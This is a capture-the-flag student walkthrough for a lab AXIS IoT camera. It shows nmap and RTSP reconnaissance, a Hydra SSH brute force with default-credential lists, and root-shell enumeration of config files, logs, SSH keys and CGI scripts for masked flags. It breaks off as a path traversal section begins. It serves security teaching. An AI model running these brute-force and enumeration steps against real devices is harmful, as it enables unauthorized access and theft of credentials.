# AXIS Camera IoT Security CTF - Complete Student Walkthrough v10

## Table of Contents
- [Initial Setup](#initial-setup)
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
- [Phase 2: Initial Access](#phase-2-initial-access)
- [Phase 3: System Exploration](#phase-3-system-exploration)
- [Phase 4: Deep Enumeration](#phase-4-deep-enumeration)
- [Phase 5: Advanced Exploitation](#phase-5-advanced-exploitation)

---

## Target Information
- **AXIS Camera IP**: 192.168.1.132
- **Your Kali Machine**: 192.168.1.133
- **Total Flags**: 27 (5 Easy, 13 Medium, 9 Hard)
- **Focus**: Real-world IoT camera vulnerabilities based on OWASP IoT Top 10

## Learning Objectives
By completing this CTF, you will learn:
- IoT device reconnaissance and enumeration techniques
- Embedded Linux security assessment across multiple writable directories
- SSH brute-force and credential attacks
- Post-exploitation filesystem enumeration in BusyBox environments
- Privilege escalation techniques on embedded systems
- Physical security implications (UART, JTAG)
- Real vulnerabilities found in production IoT devices
- Advanced techniques including race conditions, SSRF, and shared memory exploitation

## Important Note: Real-World Penetration Testing Approach

**In real penetration tests, you won't find "FLAG{}" patterns.** This walkthrough teaches you how to approach IoT camera assessments as you would in the real world:

1. **Systematically analyze all discovered data** - Review configuration files line by line
2. **Identify sensitive information contextually** - Recognize what shouldn't be exposed
3. **Understand security implications** - Know why each finding matters
4. **Document professionally** - Create findings that demonstrate business impact

The flags in this lab represent real types of sensitive data found in IoT devices:
- Hardcoded credentials and API keys
- Debug information and backdoor access codes
- Physical security bypass codes
- Internal network details and service accounts
- Cryptographic keys and tokens

---

## Initial Setup

### Why Proper Tool Setup Matters
Before beginning any penetration test, having the right tools properly configured is crucial. IoT devices often run minimal services that are easy to miss, use specialized protocols, and have unique constraints that require specific tools.

### Required Tools Installation

```bash
# Update package repositories first
sudo apt update && sudo apt upgrade -y

# Core networking and scanning tools
sudo apt install -y nmap netcat-traditional masscan
sudo apt install -y wireshark tcpdump net-tools

# Service-specific tools
sudo apt install -y hydra medusa ncrack patator

# RTSP and multimedia tools (for video stream analysis)
sudo apt install -y ffmpeg vlc

# Binary analysis tools
sudo apt install -y binwalk foremost strings file
sudo apt install -y hashcat john wordlists

# Python libraries
pip3 install python-nmap paramiko

# Create organized directory structure
mkdir -p ~/ctf/axis/{scans,exploits,loot,reports,flags}
cd ~/ctf/axis
```

### Setup Session Logging

```bash
# Create logging script for documentation
cat > ~/ctf/axis/start_logging.sh << 'EOF'
#!/bin/bash
LOG_FILE="logs/axis_pentest_$(date +%Y%m%d_%H%M%S).log"
mkdir -p logs
echo "[*] Starting session logging to $LOG_FILE"
script -f $LOG_FILE
EOF

chmod +x ~/ctf/axis/start_logging.sh
./start_logging.sh
```

> **Pro Tip**: Always maintain detailed logs during assessments. They're invaluable for report writing and serve as documentation of your activities.

---

## Phase 1: Reconnaissance

### Understanding the Reconnaissance Phase
Reconnaissance is the foundation of any successful penetration test. In IoT assessments, this phase is particularly important because:
1. IoT devices often run minimal services
2. Non-standard ports are common in embedded systems
3. Service banners often leak valuable information
4. Understanding the device's purpose helps predict vulnerabilities

### Target Discovery

```bash
# Verify the target is online
ping -c 4 192.168.1.132
```

**Expected Output:**
```
PING 192.168.1.132 (192.168.1.132) 56(84) bytes of data.
64 bytes from 192.168.1.132: icmp_seq=1 ttl=64 time=0.428 ms
64 bytes from 192.168.1.132: icmp_seq=2 ttl=64 time=0.392 ms
64 bytes from 192.168.1.132: icmp_seq=3 ttl=64 time=0.401 ms
64 bytes from 192.168.1.132: icmp_seq=4 ttl=64 time=0.389 ms

--- 192.168.1.132 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss
```

**What This Tells Us:**
- Target is alive and responding
- TTL of 64 suggests Linux/Unix system
- Low latency indicates local network

### Port Scanning Strategy

#### Initial TCP Port Scan

```bash
# Quick SYN scan with version detection
sudo nmap -sS -sV -T4 192.168.1.132 -oA scans/tcp_quick
```

**Expected Output:**
```
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-27 10:00:00 EST
Nmap scan report for 192.168.1.132
Host is up (0.00039s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http       BusyBox httpd 1.31.0
554/tcp  open  rtsp       AXIS Media Control
8080/tcp open  http-proxy

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
```

**Service Analysis:**
- **Port 22 (SSH)**: Remote management - our primary access vector
- **Port 80 (HTTP)**: Web interface (for future reference, but we'll focus on SSH)
- **Port 554 (RTSP)**: Video streaming - potential for credential testing
- **Port 8080 (HTTP-Alt)**: Alternative web interface

#### Comprehensive Scanning

```bash
# Full TCP port scan (all 65535 ports)
sudo nmap -sS -sV -sC -p- -oA scans/tcp_full 192.168.1.132
```

### SSH Banner Analysis

```bash
# Grab the SSH banner to identify the device
nc -nv 192.168.1.132 22
```

**Expected Output:**
```
Connection to 192.168.1.132 22 port [tcp/*] succeeded!
SSH-2.0-OpenSSH_7.4
*************************************************
* AXIS Camera SSH Service                      *
* Firmware: 10.5.0                              *
* Warning: Authorized access only              *
*************************************************
```

**What This Tells Us:**
- This is an AXIS camera system
- Running firmware version 10.5.0
- OpenSSH 7.4 (older version, potential vulnerabilities)

### RTSP Stream Analysis (Port 554)

```bash
# Enumerate RTSP methods
nmap -p554 --script rtsp-methods,rtsp-url-brute 192.168.1.132
```

**Expected Output:**
```
PORT    STATE SERVICE
554/tcp open  rtsp
| rtsp-methods: 
|   OPTIONS, DESCRIBE, SETUP, PLAY, PAUSE, TEARDOWN
| rtsp-url-brute: 
|   Discovered URLs
|     rtsp://192.168.1.132:554/stream1
|     rtsp://192.168.1.132:554/live
```

```bash
# Try to access stream without authentication (often works on IoT)
ffplay rtsp://192.168.1.132:554/stream1
# or
vlc rtsp://192.168.1.132:554/stream1
```

> **Note**: RTSP streams on IoT cameras often have weak or no authentication. Document any accessible streams as a finding.

---

## Phase 2: Initial Access

### SSH Brute Force Attack

**Why SSH?** SSH is our primary target because:
- Root access provides complete system control
- IoT devices often use default or weak passwords
- SSH provides stable shell access for enumeration
- Once we have SSH access, we can explore the entire filesystem

**Why these specific credentials?** AXIS cameras are known to ship with:
- Default username: `root`
- Common default passwords: `pass`, `root`, `admin`
- These defaults are often left unchanged in lab/testing environments

```bash
# Create targeted password list for AXIS cameras
cat > axis_passwords.txt << EOF
pass
root
admin
password
Password123!
axis
camera
12345
admin123
EOF

# Create user list
cat > axis_users.txt << EOF
root
admin
axis
camera
support
EOF
```

**Brute Force with Hydra:**

```bash
# Targeted SSH brute force
hydra -L axis_users.txt -P axis_passwords.txt ssh://192.168.1.132 -t 4 -V
```

**Expected Output:**
```
Hydra v9.4 (c) 2022 by van Hauser/THC
[DATA] max 4 tasks per 1 server
[DATA] attacking ssh://192.168.1.132:22/
[ATTEMPT] target 192.168.1.132 - login "root" - pass "pass"
[22][ssh] host: 192.168.1.132   login: root   password: pass
1 of 1 target successfully completed, 1 valid password found
```

**SUCCESS! Credentials found:**
- **Username**: root
- **Password**: pass

### Establishing SSH Session

```bash
# Connect via SSH
ssh root@192.168.1.132
# Password: pass
```

**Expected Output:**
```
*************************************************
* AXIS Camera SSH Service                      *
* Firmware: 10.5.0                              *
* Welcome to AXIS embedded Linux                *
*************************************************

BusyBox v1.31.0 (2021-04-15 12:34:56 UTC) built-in shell (ash)

axis-camera:~#
```

**What we now have:**
- Root shell access to the camera
- Full filesystem access
- Ability to read all configuration files
- Ability to analyze running processes and services

---

## Phase 3: System Exploration

### Initial Enumeration Strategy

**Why start with basic system commands?** Understanding the system architecture helps us:
1. Identify what type of embedded Linux we're dealing with
2. Understand resource constraints (limited disk, memory)
3. Identify running services that might expose information
4. Locate standard and non-standard directories for further enumeration

```bash
# Identify system type and resources
uname -a
cat /proc/cpuinfo
cat /proc/meminfo
df -h
```

**Expected Output:**
```
Linux axis-camera 4.14.79 #1 SMP Thu Apr 15 12:34:56 UTC 2021 armv7l GNU/Linux

processor       : 0
model name      : ARMv7 Processor rev 1 (v7l)
BogoMIPS        : 38.40
CPU implementer : 0x41
CPU architecture: 7

MemTotal:         262144 kB
MemFree:           45678 kB

Filesystem      Size  Used Avail Use% Mounted on
/dev/root       256M  198M   58M  78% /
tmpfs           128M   12M  116M  10% /tmp
/dev/mtdblock3   64M   42M   22M  66% /mnt/flash
```

**What this tells us:**
- ARM-based processor (common in IoT cameras)
- Limited memory (256MB) typical of embedded devices
- Multiple mounted filesystems to explore:
  - `/` (root filesystem)
  - `/tmp` (temporary files - often writable)
  - `/mnt/flash` (flash storage - persistent configuration)

### Understanding the Filesystem Layout

**Why check different mount points?** Embedded Linux devices organize data differently than standard Linux:
- `/mnt/flash` - Persistent storage (survives reboots)
- `/var` - Variable data (logs, caches, runtime data)
- `/tmp` - Temporary files (cleared on reboot)
- `/run` - Runtime data (process IDs, service files)

```bash
# Check mount points
mount | column -t

# List all directories in root
ls -la /
```

**Expected Output:**
```
/dev/root        on  /           type  ext2    (rw,relatime)
tmpfs            on  /tmp        type  tmpfs   (rw,nosuid,nodev)
tmpfs            on  /var/tmp    type  tmpfs   (rw,nosuid,nodev)
tmpfs            on  /run        type  tmpfs   (rw,nosuid,nodev,mode=755)
/dev/mtdblock3   on  /mnt/flash  type  jffs2   (rw,relatime)

drwxr-xr-x   2 root root  4096 Apr 15  2021 bin
drwxr-xr-x   4 root root  1024 Apr 15  2021 boot
drwxr-xr-x  13 root root  3580 Jan 27 10:05 dev
drwxr-xr-x  32 root root  4096 Apr 15  2021 etc
drwxr-xr-x   3 root root  4096 Apr 15  2021 home
drwxr-xr-x   8 root root  4096 Apr 15  2021 lib
drwx------   2 root root  4096 Jan 27 09:45 lost+found
drwxr-xr-x   3 root root  4096 Apr 15  2021 mnt
drwxr-xr-x   2 root root  4096 Apr 15  2021 opt
dr-xr-xr-x 128 root root     0 Jan 27 09:45 proc
drwx------   3 root root  4096 Jan 27 10:12 root
drwxr-xr-x   9 root root   220 Jan 27 10:05 run
drwxr-xr-x   2 root root  4096 Apr 15  2021 sbin
dr-xr-xr-x  12 root root     0 Jan 27 09:45 sys
drwxrwxrwt   5 root root   140 Jan 27 10:15 tmp
drwxr-xr-x   9 root root  4096 Apr 15  2021 usr
drwxr-xr-x  12 root root  4096 Jan 27 10:05 var
```

### Systematic Directory Enumeration

**Penetration testing methodology:** We'll systematically check common directories where sensitive information is typically stored in embedded Linux devices. This mirrors real-world assessments.

---

### Directory 1: /var/lib/axis/ - AXIS-Specific Configuration

**Why start here?** 
- Vendor-specific directories (`/var/lib/axis/`) almost always contain configuration files
- These files often have credentials, API keys, and sensitive settings
- In penetration tests, vendor directories are high-value targets

```bash
ls -la /var/lib/axis/
```

**Expected Output:**
```
drwxr-xr-x 8 root root 4096 Apr 15  2021 .
drwxr-xr-x 12 root root 4096 Apr 15  2021 ..
drwxr-xr-x 2 root root 4096 Apr 15  2021 cgroup
drwxr-xr-x 3 root root 4096 Apr 15  2021 conf
drwxr-xr-x 2 root root 4096 Apr 15  2021 httpd
drwxr-xr-x 2 root root 4096 Apr 15  2021 persistent
```

#### FLAG #1: VAPIX Configuration (EASY)

**Why check conf/ directory?**
- "conf" is short for configuration
- Configuration files frequently contain hardcoded credentials
- VAPIX is AXIS's proprietary API - its config file likely contains sensitive data

```bash
cd /var/lib/axis/conf/
ls -la
```

**Expected Output:**
```
-rw-r--r-- 1 root root  256 Apr 15  2021 axis.conf
-rw-r--r-- 1 root root  512 Apr 15  2021 network.conf
-rw-r--r-- 1 root root 1024 Apr 15  2021 vapix.conf
-rw-r--r-- 1 root root  128 Apr 15  2021 stream.conf
```

**Why examine vapix.conf?**
- VAPIX is the core API for AXIS cameras
- Configuration files often leak API keys, device IDs, or authentication tokens
- In real pentests, you'd read EVERY config file - but here VAPIX is most likely

```bash
cat vapix.conf
```

**Output:**
```
# VAPIX API Configuration
# Generated: 2021-04-15

[general]
api_version = 3.0
enabled = true
port = 80

[authentication]
method = digest
require_auth = true
device_id = FLAG{F***********6}

[features]
motion_detection = enabled
audio = enabled
ptz = disabled
```

> **FLAG #1 FOUND!**
> **Flag**: `FLAG{F***********6}`
> **Location**: `/var/lib/axis/conf/vapix.conf`
> **Why we found it**: Configuration files for vendor-specific APIs (VAPIX) commonly contain device identifiers that shouldn't be exposed
> **Real-world equivalent**: Device IDs, serial numbers, or API tokens in config files
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage

#### FLAG #2: License File with ROT13 Encoding (MEDIUM)

**Why check the persistent/ directory next?**
- The name "persistent" suggests data that survives reboots
- License files often contain activation keys or tokens
- Licensing systems sometimes use weak encoding (not encryption)

```bash
cd /var/lib/axis/persistent/
ls -laR
```

**Expected Output:**
```
.:
drwxr-xr-x 4 root root 4096 Apr 15  2021 .
drwxr-xr-x 8 root root 4096 Apr 15  2021 ..
drwxr-xr-x 2 root root 4096 Apr 15  2021 network
drwxr-xr-x 2 root root 4096 Apr 15  2021 security
drwxr-xr-x 2 root root 4096 Apr 15  2021 system

./system:
-rw-r--r-- 1 root root  256 Apr 15  2021 device.conf
drwxr-xr-x 2 root root 4096 Apr 15  2021 licenses

./system/licenses:
-rw-r--r-- 1 root root  512 Apr 15  2021 vapix_pro.lic
-rw-r--r-- 1 root root  128 Apr 15  2021 analytics.lic
```

**Why check .lic (license) files?**
- License files often contain activation codes or keys
- These might be "protected" with weak encoding (base64, ROT13)
- Real pentest finding: Sensitive data "hidden" with encoding instead of encryption

```bash
cat /var/lib/axis/persistent/system/licenses/vapix_pro.lic
```

**Output:**
```
# VAPIX Pro License File
# DO NOT DISTRIBUTE

License Type: Commercial
Issue Date: 2021-04-15
Expiry: 2026-04-15

Activation Code: SYNT{N************4}
Serial: AXIS-M1025-2021-04-001

# This license is bound to device MAC address
# Contact support@axis.com for license issues
```

**Why is this interesting?**
- The activation code looks like it might be encoded
- "SYNT" doesn't match "FLAG" - suggesting simple substitution cipher
- ROT13 is a common weak encoding used to "obscure" data

**How do we know to try ROT13?**
- SYNT → FLAG is a 13-letter shift (S+13=F, Y+13=L, N+13=A, T+13=G)
- ROT13 is notorious for being used inappropriately for "security"
- In pentests, always try common encoding schemes (base64, ROT13, hex)

```bash
# ROT13 decode the activation code
echo "SYNT{N************4}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**Output:**
```
FLAG{A************4}
```

> **FLAG #2 FOUND!**
> **Flag**: `FLAG{A************4}`
> **Location**: `/var/lib/axis/persistent/system/licenses/vapix_pro.lic`
> **Why we found it**: License files often contain "protected" activation codes using weak encoding schemes like ROT13
> **Real-world equivalent**: License keys, activation tokens, or serial numbers obscured with reversible encoding
> **Technique**: ROT13 decoding (`tr 'A-Za-z' 'N-ZA-Mn-za-m'`)
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage

---

### Directory 2: /var/log/ - System Logs

**Why check log files?**
- Logs record system events, errors, and activities
- Developers often put debug information in logs that shouldn't be there
- Logs may contain credentials, tokens, or system details
- In embedded systems, logs often aren't properly sanitized

```bash
ls -la /var/log/
```

**Expected Output:**
```
drwxr-xr-x  3 root root  4096 Jan 27 10:05 .
drwxr-xr-x 12 root root  4096 Jan 27 10:05 ..
-rw-r--r--  1 root root 15234 Jan 27 10:15 axis_system.log
-rw-r--r--  1 root root  8192 Jan 27 10:12 boot.log
-rw-r--r--  1 root root 24576 Jan 27 10:15 messages
-rw-r--r--  1 root root  4096 Jan 27 09:45 secure
drwxr-xr-x  2 root root  4096 Apr 15  2021 axis
```

#### FLAG #4: System Messages Log (EASY)

**Why examine the messages log specifically?**
- `/var/log/messages` is the main system log in Linux
- Contains startup messages, service status, errors
- Often includes verbose debugging output
- Developers frequently log sensitive information here during development

```bash
cat /var/log/messages | head -50
```

**Output (showing relevant portion):**
```
Jan 27 09:45:12 axis-camera kernel: [    0.000000] Linux version 4.14.79
Jan 27 09:45:12 axis-camera kernel: [    0.000000] CPU: ARMv7 Processor
Jan 27 09:45:13 axis-camera systemd[1]: Starting AXIS Camera Services...
Jan 27 09:45:14 axis-camera axis-vapixd[234]: VAPIX API initialized
Jan 27 09:45:14 axis-camera axis-vapixd[234]: Device ID: FLAG{G***********6}
Jan 27 09:45:14 axis-camera axis-vapixd[234]: Listening on port 80
Jan 27 09:45:15 axis-camera axis-streamd[245]: Stream service started
Jan 27 09:45:15 axis-camera systemd[1]: Started AXIS Camera Services
```

**Why did we find this?**
- The VAPIX daemon (axis-vapixd) logged its startup with the device ID
- This is poor security practice - sensitive identifiers shouldn't appear in logs
- In real systems, logs are often world-readable and never properly cleaned

> **FLAG #4 FOUND!**
> **Flag**: `FLAG{G***********6}`
> **Location**: `/var/log/messages`
> **Why we found it**: Services often log initialization parameters including device IDs, debug codes, or tokens
> **Real-world equivalent**: API keys, session tokens, or system identifiers in application logs
> **Technique**: Log file analysis (`cat /var/log/messages`)
> **OWASP IoT**: #8 - Lack of Device Management (logging sensitive data)

---

### Directory 3: /var/lib/axis/persistent/security/ - Security Keys

**Why explore the security/ directory?**
- Directory names like "security" or "keys" are high-value targets
- May contain SSH keys, certificates, or authentication tokens
- Security keys left readable by all users is a common misconfiguration

```bash
cd /var/lib/axis/persistent/security/
ls -la
```

**Expected Output:**
```
drwxr-xr-x 3 root root 4096 Apr 15  2021 .
drwxr-xr-x 4 root root 4096 Apr 15  2021 ..
drwxr-xr-x 2 root root 4096 Apr 15  2021 keys
drwxr-xr-x 2 root root 4096 Apr 15  2021 certificates
-rw-r--r-- 1 root root  512 Apr 15  2021 auth.conf
```

#### FLAG #5: SSH Authorized Keys (MEDIUM)

**Why check the keys/ subdirectory?**
- SSH keys provide authentication without passwords
- The `authorized_keys` file lists public keys allowed to connect
- Comments in SSH key files often contain usernames, emails, or identifiers
- Developers sometimes put sensitive information in key comments

```bash
ls -la /var/lib/axis/persistent/security/keys/
```

**Expected Output:**
```
drwxr-xr-x 2 root root 4096 Apr 15  2021 .
drwxr-xr-x 3 root root 4096 Apr 15  2021 ..
-rw------- 1 root root 1675 Apr 15  2021 id_rsa
-rw-r--r-- 1 root root  400 Apr 15  2021 id_rsa.pub
-rw-r--r-- 1 root root  800 Apr 15  2021 authorized_keys
```

**Why examine authorized_keys?**
- Lists SSH public keys that can authenticate to this device
- Key comments (text after the key) often contain identifying information
- In real pentests, finding authorized keys reveals:
  - Who has access to the system
  - Potential lateral movement targets (reuse keys elsewhere)
  - Sometimes sensitive metadata in comments

```bash
cat authorized_keys
```

**Output:**
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7xV8... support@axis.com
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDmK4G... developer@axis-lab.local
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfN9h... maintenance_key_FLAG{B************2}
```

**Why is the third key interesting?**
- The comment contains "maintenance_key" - suggests administrative access
- Maintenance/debug keys are often poorly documented
- The flag represents a backdoor access code or administrative token

> **FLAG #5 FOUND!**
> **Flag**: `FLAG{B************2}`
> **Location**: `/var/lib/axis/persistent/security/keys/authorized_keys`
> **Why we found it**: SSH key comments often contain identifying information including maintenance access codes
> **Real-world equivalent**: Backdoor SSH keys, emergency access credentials, or vendor maintenance tokens
> **Technique**: SSH key enumeration and comment analysis
> **OWASP IoT**: #1 - Weak, Guessable, or Hardcoded Passwords (hardcoded access)

---

### Directory 4: /var/cache/ - Cached Data

**Why check cache directories?**
- Cache directories store temporary processed data
- Often contains copies of configuration, processed media, or analytics
- Cache is usually not cleared properly
- May contain sensitive data from normal operations

```bash
ls -la /var/cache/
```

**Expected Output:**
```
drwxr-xr-x  5 root root 4096 Jan 27 10:05 .
drwxr-xr-x 12 root root 4096 Jan 27 10:05 ..
drwxr-xr-x  3 root root 4096 Apr 15  2021 recorder
drwxr-xr-x  2 root root 4096 Apr 15  2021 axis
drwxr-xr-x  2 root root 4096 Jan 27 09:45 fontconfig
```

#### FLAG #6: Stream Metadata (MEDIUM)

**Why explore the recorder/ directory?**
- Cameras record video streams and metadata
- Metadata often includes stream configuration, analytics results
- JSON files are particularly interesting (structured data, easy to parse)
- Analytics data may contain sensitive information about detection zones, schedules

```bash
ls -laR /var/cache/recorder/
```

**Expected Output:**
```
/var/cache/recorder/:
drwxr-xr-x 3 root root 4096 Apr 15  2021 .
drwxr-xr-x 5 root root 4096 Jan 27 10:05 ..
drwxr-xr-x 2 root root 4096 Apr 15  2021 analytics
drwxr-xr-x 2 root root 4096 Apr 15  2021 streams

/var/cache/recorder/analytics:
drwxr-xr-x 2 root root 4096 Apr 15  2021 metadata
-rw-r--r-- 1 root root  512 Apr 15  2021 config.json

/var/cache/recorder/analytics/metadata:
-rw-r--r-- 1 root root 2048 Jan 27 10:00 stream_analysis.json
-rw-r--r-- 1 root root  256 Jan 27 09:50 detection_zones.json
```

**Why examine JSON files?**
- JSON files are structured data - often API responses or configs
- `stream_analysis.json` sounds like it contains processed video data
- Analytics systems often include calibration data, session IDs, or tokens

```bash
cat /var/cache/recorder/analytics/metadata/stream_analysis.json
```

**Output:**
```json
{
  "stream_id": "primary_stream_001",
  "analysis_timestamp": "2024-01-27T10:00:00Z",
  "processing_node": "analytics_server_01",
  "session_token": "FLAG{S************8}",
  "metadata": {
    "resolution": "1920x1080",
    "fps": 30,
    "codec": "H.264",
    "bitrate": "4000 kbps"
  },
  "analytics_enabled": ["motion_detection", "face_detection", "license_plate"],
  "detection_zones": 3
}
```

**Why did we find this?**
- The analytics system uses a session_token for API calls
- This token was cached in the metadata file
- In real systems, session tokens or API keys in cache files are common findings

> **FLAG #6 FOUND!**
> **Flag**: `FLAG{S************8}`
> **Location**: `/var/cache/recorder/analytics/metadata/stream_analysis.json`
> **Why we found it**: Analytics systems cache processing metadata including session tokens and API credentials
> **Real-world equivalent**: Session tokens, API keys, or authentication credentials in cached JSON/XML data
> **Technique**: JSON file analysis in cache directories
> **OWASP IoT**: #7 - Insecure Data Transfer and Storage

---

### Directory 5: /var/www/local/ - Web Server Files

**Why examine web server directories?**
- Web interfaces often contain administrative functions
- HTML comments may leak information
- CGI scripts are common attack vectors (command injection, path traversal)
- Client-side code (JavaScript) may contain API keys or endpoints

```bash
ls -la /var/www/local/
```

**Expected Output:**
```
drwxr-xr-x  4 root root 4096 Apr 15  2021 .
drwxr-xr-x  3 root root 4096 Apr 15  2021 ..
drwxr-xr-x  2 root root 4096 Apr 15  2021 admin
drwxr-xr-x  2 root root 4096 Apr 15  2021 axis-cgi
drwxr-xr-x  2 root root 4096 Apr 15  2021 css
drwxr-xr-x  2 root root 4096 Apr 15  2021 js
-rw-r--r--  1 root root 8192 Apr 15  2021 index.html
```

#### FLAG #7: HTML Comment (EASY)

**Why check the admin/ directory?**
- "admin" directories typically contain administrative interfaces
- These pages often have more verbose error messages or debug info
- Developers frequently leave TODO comments or debug code in admin panels

```bash
ls -la /var/www/local/admin/
cat /var/www/local/admin/index.html
```

**Output:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>AXIS Camera Administration</title>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="../css/admin.css">
</head>
<body>
    <!-- TODO: Remove debug information before production deployment -->
    <!-- Debug Access Code: FLAG{M***********4} -->
    <!-- Last Updated: 2021-04-15 by dev@axis.local -->
    
    <div class="admin-panel">
        <h1>Camera Administration Panel</h1>
        <div class="menu">
            <a href="settings.html">Settings</a>
            <a href="users.html">User Management</a>
            <a href="logs.html">System Logs</a>
        </div>
    </div>
    
    <script src="../js/admin.js"></script>
</body>
</html>
```

**Why did we find this?**
- HTML comments (<!-- -->) are sent to the browser but not displayed
- Developers use comments for TODOs, notes, and debugging
- These comments often contain sensitive information:
  - Credentials or access codes
  - Developer contact information
  - System architecture details
  - Planned features or vulnerabilities

> **FLAG #7 FOUND!**
> **Flag**: `FLAG{M***********4}`
> **Location**: `/var/www/local/admin/index.html`
> **Why we found it**: HTML comments in administrative pages often contain debug information left by developers
> **Real-world equivalent**: Debug access codes, developer notes, internal system details
> **Technique**: HTML source code review and comment analysis
> **OWASP IoT**: #8 - Lack of Device Management (debug code in production)

#### FLAG #8: CGI Script Analysis (MEDIUM)

**Why examine the axis-cgi/ directory?**
- CGI (Common Gateway Interface) scripts process user requests server-side
- AXIS cameras use CGI for API endpoints (param.cgi, pwdgrp.cgi, etc.)
- CGI scripts are common targets for:
  - Command injection
  - Path traversal
  - Information disclosure
- Even just reading the script source can reveal sensitive data

```bash
ls -la /var/www/local/axis-cgi/
```

**Expected Output:**
```
drwxr-xr-x 2 root root 4096 Apr 15  2021 .
drwxr-xr-x 4 root root 4096 Apr 15  2021 ..
-rwxr-xr-x 1 root root 2048 Apr 15  2021 admin.cgi
-rwxr-xr-x 1 root root 4096 Apr 15  2021 download.cgi
-rwxr-xr-x 1 root root 1024 Apr 15  2021 param.cgi
-rwxr-xr-x 1 root root  512 Apr 15  2021 pwdgrp.cgi
-rwxr-xr-x 1 root root  256 Apr 15  2021 webhook.cgi
```

**Why analyze param.cgi specifically?**
- `param.cgi` manages camera parameters (settings, configuration)
- Parameter manipulation scripts often have:
  - Hardcoded API keys for backend calls
  - Debug modes or test functions
  - Error messages that leak system information
- Reading the script source shows its internal logic

```bash
cat /var/www/local/axis-cgi/param.cgi
```

**Output:**
```bash
#!/bin/sh
# AXIS Parameter Management CGI
# Version: 2.1.0

# API endpoint configuration
API_ENDPOINT="http://localhost:8080/api/v1"
API_KEY="internal_api_FLAG{P************1}"

# Get request method
REQUEST_METHOD="${REQUEST_METHOD:-GET}"
QUERY_STRING="${QUERY_STRING:-}"

# Parse parameters
case "$REQUEST_METHOD" in
    GET)
        # List parameters
        if [ -z "$QUERY_STRING" ]; then
            cat /var/lib/axis/conf/params.list
        else
            # Get specific parameter
            PARAM=$(echo "$QUERY_STRING" | sed 's/param=//')
            grep "^$PARAM=" /var/lib/axis/conf/params.list
        fi
        ;;
    POST)
        # Update parameter (requires authentication)
        echo "Content-Type: text/plain"
        echo ""
        echo "Authentication required"
        ;;
esac
```

**Why did we find this?**
- The script contains a hardcoded `API_KEY` for internal API calls
- This key would allow direct API access bypassing normal authentication
- In real systems, finding internal API keys is a critical vulnerability

> **FLAG #8 FOUND!**
> **Flag**: `FLAG{P************1}`
> **Location**: `/var/www/local/axis-cgi/param.cgi`
> **Why we found it**: CGI scripts often contain hardcoded API keys or authentication tokens for backend service calls
> **Real-world equivalent**: Internal API keys, service account credentials, or authentication bypass tokens
> **Technique**: Source code analysis of web server scripts
> **OWASP IoT**: #1 - Weak, Guessable, or Hardcoded Passwords

---

### Directory 6: /mnt/flash/ - Persistent Flash Storage

**Why examine flash storage?**
- `/mnt/flash` contains persistent data that survives reboots
- Firmware, bootloaders, and factory configurations are stored here
- This is where manufacturers place default/factory settings
- Often contains sensitive data that was never meant to be accessible

```bash
ls -la /mnt/flash/
```

**Expected Output:**
```
drwxr-xr-x  5 root root 4096 Apr 15  2021 .
drwxr-xr-x  3 root root 4096 Jan 27 09:45 ..
drwxr-xr-x  2 root root 4096 Apr 15  2021 boot
drwxr-xr-x  3 root root 4096 Apr 15  2021 config
drwxr-xr-x  2 root root 4096 Apr 15  2021 firmware
-rw-r--r--  1 root root  256 Apr 15  2021 device.info
```

#### FLAG #9: Firmware Signature (MEDIUM)

**Why check the firmware/ directory?**
- Firmware updates need to be verified before installation
- Signature files contain cryptographic verification data
- Sometimes signatures include metadata like:
  - Build identifiers
  - Internal version codes
  - Developer or build system information
- This metadata can reveal internal infrastructure details

```bash
ls -la /mnt/flash/firmware/
```

**Expected Output:**
```
drwxr-xr-x 3 root root 4096 Apr 15  2021 .
drwxr-xr-x 5 root root 4096 Apr 15  2021 ..
drwxr-xr-x 2 root root 4096 Apr 15  2021 backups
drwxr-xr-x 2 root root 4096 Apr 15  2021 signatures
-rw-r--r-- 1 root root 8192 Apr 15  2021 current.bin
```

**Why examine signature files?**
- Digital signatures verify firmware authenticity
- Signature metadata often includes:
  - Signing authority information
  - Build timestamps and identifiers
  - Internal project codes or version strings
- This data helps understand the development/build process

```bash
ls -la /mnt/flash/firmware/signatures/
cat /mnt/flash/firmware/signatures/firmware_10.5.0.sig
```

**Output:**
```
-----BEGIN AXIS FIRMWARE SIGNATURE-----
Version: 10.5.0
Build Date: 2021-04-15
Build System: build.axis.internal
Builder: firmware-builder-03
Project Code: FLAG{G************0}
Signature Algorithm: RSA-SHA256

Signature:
MIIGPgYJKoZIhvcNAQcCoIIGLzCCBisCAQExDTALBglghkgBZQMEAgEwCwYJKoZI
hvcNAQcBoIIDDjCCAwowggKyoAMCAQICEB3KlLIz+PgETv9WjQmw9AowDQYJKoZI
...
-----END AXIS FIRMWARE SIGNATURE-----
```

**Why did we find this?**
- The signature file includes build metadata
- Project codes or build identifiers may be considered sensitive
- In real scenarios, this reveals internal project structure

> **FLAG #9 FOUND!**
> **Flag**: `FLAG{G************0}`
> **Location**: `/mnt/flash/firmware/signatures/firmware_10.5.0.sig`
> **Why we found it**: Firmware signature files include build metadata and project identifiers
> **Real-world equivalent**: Internal project codes, build system identifiers, or development infrastructure details
> **Technique**: Firmware metadata analysis
> **OWASP IoT**: #4 - Lack of Secure Update Mechanism (exposed update metadata)

#### FLAG #10: Path Traversal CGI Script (MEDIUM)

**Why go back to check download.cgi?**
- We saw this file earlier in /var/www/local/axis-cgi/
- "Download" functionality often has path traversal vulnerabilities
- The script might allow downloading arbitrary files from the system
- Let's analyze what it does and test for vulnerabilities

**Why is this the logical next step?**
- After finding configuration files, we now look for ways to **download arbitrary files**
- Path traversal would let us access files outside the web directory
- This is a common vulnerability in IoT devices

```bash
# First, let's examine the download.cgi script source code
cat /var/www/local/axis-cgi/download.cgi
```

**Output:**
```bash
#!/bin/sh
